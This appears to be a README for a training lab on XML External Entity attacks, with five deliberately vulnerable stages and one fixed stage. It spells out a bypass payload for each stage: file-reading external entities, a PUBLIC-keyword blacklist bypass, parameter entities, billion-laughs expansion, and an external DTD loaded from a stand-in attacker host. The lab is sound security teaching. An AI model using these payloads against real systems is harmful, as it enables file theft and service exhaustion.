# Lab 20 — XML External Entity (XXE)

| | |
|---|---|
| **Tier** | 5 — Advanced |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Difficulty** | hard |
| **Stages** | 5 vulnerable + 1 fixed |

## 🎯 The scenario
A product-import feature parses XML with entity support. Use an external entity to read
a secret file on the server's disk (the path is shown on each stage).

> The XML parser is a small, dependency-free, config-driven resolver in `shared.js` —
> each stage toggles which entity features it allows. A stage is solved when the entity
> payload is processed (a file read, or a runaway expansion).

## 🧠 The one idea
XXE comes from the parser processing **DTDs and entities** at all. Disable DOCTYPE/DTD
processing and external entities — one setting that closes every variant. Blacklists and
partial disables always leave a path.

---

## Stage 1 — External entities enabled · `/stage/1`
`<!ENTITY xxe SYSTEM "file://…">` → reads the file.

## Stage 2 — Blacklists SYSTEM · `/stage/2`
Blocks the word `SYSTEM`. **Bypass:** `<!ENTITY xxe PUBLIC "-//x//EN" "file://…">`.

## Stage 3 — Parameter entities still external · `/stage/3`
General external off. **Bypass:** `<!ENTITY % p SYSTEM "file://…"><!ENTITY xxe "%p;">`.

## Stage 4 — Entity expansion (billion laughs) · `/stage/4`
No external, but unbounded internal expansion. **Bypass:** nested `a→b→c→d` ten-fold each.

## Stage 5 — External DTD fetched · `/stage/5`
Inline external off, but the external DTD is loaded. **Bypass:** `<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd">` (the DTD declares the SYSTEM entity).

## Stage 6 — DTDs disabled · `/fixed`
```js
if (/<!DOCTYPE|<!ENTITY/i.test(xml)) reject;   // 🟢 no entity processing at all
```
Every variant fails; plain XML still parses.

### ✅ Takeaways
- Disable DTD/DOCTYPE processing and external entities in your XML parser (one flag in most libraries).
- Don't blacklist keywords or partially disable — parameter entities and external DTDs remain.
- Cap entity expansion as defense-in-depth.

## ▶️ Run it
```bash
npm run dev                              # → http://localhost:4020
# or: cd labs/20-xxe && docker compose up
```

## 🧪 Tests
```bash
cd exploit && npm install && npm test
```
Each vulnerable stage must process its entity payload; `/fixed` must reject all of them
while still parsing plain XML.
